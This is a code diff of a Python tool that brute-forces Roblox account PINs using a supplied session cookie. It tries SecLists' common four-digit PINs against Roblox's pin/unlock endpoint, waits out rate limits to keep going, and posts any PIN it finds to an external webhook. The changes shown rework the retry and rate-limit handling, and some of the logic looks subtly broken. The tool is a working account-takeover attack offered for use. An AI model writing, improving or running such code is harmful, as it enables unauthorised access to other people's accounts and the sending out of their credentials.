@@ -147,7 +147,7 @@ class Crack:
             
         print("")
         uiprint()
-        for char in 'Leave this running for about around 5-29 days':
+        for char in 'Leave this running for about around 2 days':
             time.sleep(0.03)
             cprint(char, 'magenta', end='', flush=True)
         cookies = {
@@ -171,7 +171,7 @@ class Crack:
                 time.sleep(4)
                 self.clear()
                 self.check()
-            pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9999]
+            pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
         else:
             startingLine = 0
             pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
@@ -188,46 +188,54 @@ class Crack:
                 progress[str(userid)] = int(line+startingLine)
                 json.dump(progress, f, indent=1)
 
-            response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
+            request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
+            response = request.json()
+            status_code = request.status_code
+
             pin = pins[line]
             # --({ Check if the pin was found }) -- #
-            try:
-                    if "unlockedUntil" in str(response):
-                        uiprint("Cookie:", 'cyan')
 
-                        print(cookie)
-                        uiprint(f"Pin found: {pin}", 'green')
+            while True:
+                try:
+                        if "unlockedUntil" in str(response):
+                            uiprint("Cookie:", 'cyan')
 
-                        r = requests.post(self.webhook, data={'content':pin})
-                        if not r.status_code ==200:
-                            print("[", end="")
-                            cprint("ERROR", end="")
-                            print("] " , end="")
+                            print(cookie)
+                            uiprint(f"Pin found: {pin}", 'green')
 
-                            cprint('Invalid Webhook', 'red')
-                        os.system("PAUSE")
+                            r = requests.post(self.webhook, data={'content':pin})
+                            if not r.status_code ==200:
+                                print("[", end="")
+                                cprint("ERROR", end="")
+                                print("] " , end="")
 
-                    if response['errors'][0]['code'] == 4:
-                        uiprint("Incorrect Pin", 'red')
+                                cprint('Invalid Webhook', 'red')
+                            os.system("PAUSE")
 
-                    elif response['errors'][0]['message'] == "TooManyRequests":
-                        uiprint(f'Too many requests. Waiting 21 minutes before resumimg', 'ratelimit')
-                        time.sleep(60 * 21)
+                        if response['errors'][0]['code'] == 4:
+                            uiprint("Incorrect Pin", 'red')
+                            break
 
-                    if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
-                        uiprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")
+                        elif response['errors'][0]['message'] == "Too many requests":
+                            uiprint(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
+                            time.sleep(60 * 20 + 2)
+                            continue
 
-                        time.sleep(5)
-                        self.start()
-                        break
+                        if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
+                            uiprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")
 
-                    elif response['errors'][0]['message'] == 'Token Validation Failed':
-                        uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
-                        time.sleep(5)
-                        self.start()
-                        break
-            except Exception as e:
-                print(f"A error has occured {e}")
+                            time.sleep(5)
+                            os.system("PAUSE")
+                            exit()
+
+                        elif response['errors'][0]['message'] == 'Token Validation Failed':
+                            uiprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
+                            time.sleep(5)
+                            os.system("PAUSE")
+                            exit()
+
+                except Exception as e:
+                    print(f"A error has occured {e}")
         else:
             uiprint("Invalid Cookie", 'error')
 
